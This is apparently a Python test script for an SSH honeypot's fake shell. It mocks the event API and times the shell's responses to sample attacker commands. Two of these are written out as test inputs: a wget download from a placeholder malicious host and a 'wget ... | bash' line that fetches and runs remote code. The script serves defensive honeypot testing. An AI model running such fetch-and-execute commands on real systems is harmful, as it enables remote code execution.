import sys
import time
import queue

# Mock paramiko channel
class MockChannel:
    def send(self, data):
        sys.stdout.write(data.decode("utf-8", errors="ignore"))

from services.ssh.ssh_honeypot import FakeShell, FAKE_USERS
import services.ssh.ssh_honeypot as shp

# Patch send_event so we can see when it fires and see if it's asynchronous
def mock_send_event(event_type, details, high_value=False):
    print(f"\n[MOCK API] Received API POST for event: {event_type} | Cmd: {details.get('command')}", flush=True)
    # Simulate API latency
    time.sleep(1.0)
    print(f"[MOCK API] Completed API POST", flush=True)
    return {"response": {"action": "CONTAIN"}, "terminal_output": "[LLM_PAYLOAD_HERE]\n"}

shp.send_event = mock_send_event

client_ip = "127.0.0.1"
chan = MockChannel()
shell = FakeShell("admin", client_ip, chan)

print("--- Testing Deterministic Fast Path (ls) ---", flush=True)
start = time.time()
shell.handle("ls -la")
print(f"\n*** Time taken: {time.time() - start:.4f}s ***\n")
time.sleep(1.2) # wait for async log to finish

print("--- Testing Native Handler with Fake Latency (wget) ---")
start = time.time()
shell.handle("wget http://malicious.com/payload.sh")
print(f"\n*** Time taken: {time.time() - start:.4f}s ***\n")
time.sleep(1.2)

print("\n--- Testing Unknown Command (AI Slow Path) ---")
start = time.time()
shell.handle("nmap -sV 10.0.1.0/24")
print(f"\n*** Time taken: {time.time() - start:.4f}s ***\n")

print("\n--- Testing Compound Exploit Command (AI Slow Path) ---")
start = time.time()
shell.handle("wget http://x.com/pay.sh | bash")
print(f"\n*** Time taken: {time.time() - start:.4f}s ***\n")
